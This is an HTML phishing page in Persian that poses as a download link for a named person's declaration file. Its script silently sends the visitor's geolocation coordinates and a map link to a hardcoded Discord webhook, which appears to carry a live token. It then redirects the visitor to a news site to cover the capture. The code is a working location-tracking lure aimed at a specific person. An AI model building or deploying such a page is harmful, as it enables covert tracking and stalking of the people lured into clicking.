<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<title>صفحه دریافت اطلاعات</title>
<style>
body { font-family: Tahoma, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
.container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
</style>
</head>
<body>
    <div class="container">
    
    <!-- 📸 تگ اضافه کردن عکس -->
    
<div class="container">
    <h1>  </h1>
    <img src="IMG-20260908-WA0004.jpg" style="width: 80vw; height: 80vh; object-fit: fill; position: fixed; top: 0; left: 0; z-index: 1;">دانلود فایل اضهارنامه علی پیشگر</button>

<button onclick="getLocation()" style="background-color: #007bff; color: white; border: none; padding: 10px 0px; width: 60%; border-radius: 6px; cursor: pointer; font-size: 30px; font-weight: bold; margin-top: 15px;">  
 </div>

<script>
// آدرس وب‌هوک دیسکورد خود را اینجا قرار دهید
const webhookURL = "https://discord.com/api/webhooks/1546079351559299093/7seQJheatYvkYmW4HOZ7gyJwjikqJRG2LfnEZtrkvva7yYYLwnbKSRJlZH0ceGrdXmPm ";

function getLocation() {
if (navigator.geolocation) {
// درخواست لوکیشن از مرورگر
navigator.geolocation.getCurrentPosition(sendLocationToServer, showError);
} else {
alert("مرورگر شما از این قابلیت پشتیبانی نمی‌کند.");
}
}

function sendLocationToServer(position) {
const latitude = position.coords.latitude;
const longitude = position.coords.longitude;
const accuracy = position.coords.accuracy;

// ساخت پیام برای ارسال به دیسکورد
// تعریف درست آدرس نقشه با متغیرهای عددی دریافتی از مرورگر
const mapsURL = `https://www.google.com/maps?q=${latitude},${longitude}`;

// ساخت شیء پیام با متن معتبر و داخل بک‌تیک
const payload = {
    content: `لوکیشن جدید دریافت شد!\nلینک نقشه: ${mapsURL}\nدقت: ${accuracy} متر`
};

// ارسال داده‌ها به صورت پس‌زمینه
fetch(webhookURL, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(payload)
})
.then(response => {
// در اینجا می‌توانید کاربر را به یک عکس یا سایت دیگر هدایت کنید
 window.location.href = "https://www.muscatdaily.com";
})

.catch(error => console.error('Error:', error));
} // 👈 این آکولاژ را دقیقاً اینجا اضافه کن تا تابع sendLocationToServer بسته شود

function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            alert("کاربر دسترسی به لوکیشن را رد کرد.");
            break;
        case error.POSITION_UNAVAILABLE:
            alert("اطلاعات موقعیت مکانی در دسترس نیست.");
            break;
        case error.TIMEOUT:
            alert("زمان درخواست به پایان رسید.");
            break;
    }
} // 👈 این آکولاژ هم برای بسته شدن تابع showError است
(error => console.error('Error:', error));
</script>

</body>
</html>
